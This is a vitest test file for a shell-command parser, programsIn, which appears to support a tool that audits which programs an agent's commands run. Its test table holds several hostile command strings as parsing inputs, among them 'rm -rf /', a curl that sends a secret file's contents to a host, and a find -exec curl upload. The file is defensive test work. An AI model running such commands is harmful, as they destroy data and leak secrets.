import { readFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { programsIn } from "./shell.ts";

const REAL: string[] = JSON.parse(
  readFileSync(join(import.meta.dirname, "fixtures/checkpoint1-commands.json"), "utf8"),
);

describe("programsIn (B1-01)", () => {
  it.each([
    ["ls -la", ["ls"]],
    [
      "cd app && FOO=1 ./node_modules/.bin/vitest run | tee out; echo $(whoami)",
      ["cd", "vitest", "tee", "echo", "whoami"],
    ],
    ['for f in a b c; do wc -l "$f"; done', ["wc"]],
    ['for f in docs/*.md\ndo\n  grep -q x "$f" || echo "$f"\ndone', ["grep", "echo"]],
    ["if [ -f x ]; then cat x; else touch x; fi", ["[", "cat", "touch"]],
    ['while read l; do echo "$l"; done < file.txt', ["read", "echo"]],
    ["sed -i 's|a; b|c|; s|d|e|' f.md", ["sed"]],
    [
      "python3 - <<'EOF'\nimport os\nos.system('rm -rf /')\nprint(1)\nEOF\necho done",
      ["python3", "echo"],
    ],
    ["cat > f <<-EOF\n\tfor x in; do evil; done\n\tEOF", ["cat"]],
    ['node -e \'const x = require("fs"); x.readFileSync("a")\'', ["node"]],
    ['echo "value: $(git rev-parse HEAD)" > out.txt 2>&1', ["echo", "git"]],
    ["diff <(sort a) <(sort b)", ["diff", "sort", "sort"]],
    ['case "$1" in\n  a) foo ;;\n  b|c) bar baz ;;\nesac', ["foo", "bar"]],
    ["f() { curl -s x; }; f", ["curl", "f"]],
    ["x=$((1 + 2)); echo $x  # a comment; rm -rf /", ["echo"]],
    ['grep -c x <<< "$text"', ["grep"]],
    ["exec 3>&1; sudo reboot", ["exec", "sudo", "reboot"]],
    // What a wrapper runs counts too (Audit 2).
    ["bash -c 'curl http://x/$(cat secret)'", ["bash", "curl", "cat"]],
    ['sh -lc "scp f host:"', ["sh", "scp"]],
    ["find . -name '*.js' -exec curl -d @{} x \\; -print", ["find", "curl"]],
    ["ls | xargs -I {} sh -c 'wget {}'", ["ls", "xargs", "sh", "wget"]],
    ["env FOO=1 nice -n 5 timeout 10s ssh host", ["env", "nice", "timeout", "ssh"]],
    ['eval "rsync a b"', ["eval", "rsync"]],
    ["bash script.sh", ["bash"]],
  ])("%s", (cmd, programs) => {
    expect(programsIn(cmd)).toEqual(programs);
  });

  it("finds only real programs in the twelve commands of the first job", () => {
    const ok = new Set([
      "for",
      "cd",
      "sed",
      "node",
      "test",
      "mkdir",
      "cat",
      "python3",
      "echo",
      "grep",
      "ls",
      "wc",
      "head",
      "tail",
      "printf",
      "[",
      "sh",
      "true",
      "find",
      "diff",
      "rm",
      "cp",
      "mv",
      "awk",
      "sort",
      "tr",
      "cut",
      "xargs",
      "tee",
      "basename",
      "dirname",
      "exit",
      "read",
      "set",
      "pnpm",
      "npm",
      "git",
    ]);
    for (const cmd of REAL) {
      const found = programsIn(cmd);
      expect(
        found.filter((p) => !ok.has(p)),
        cmd.slice(0, 120),
      ).toEqual([]);
    }
  });
});
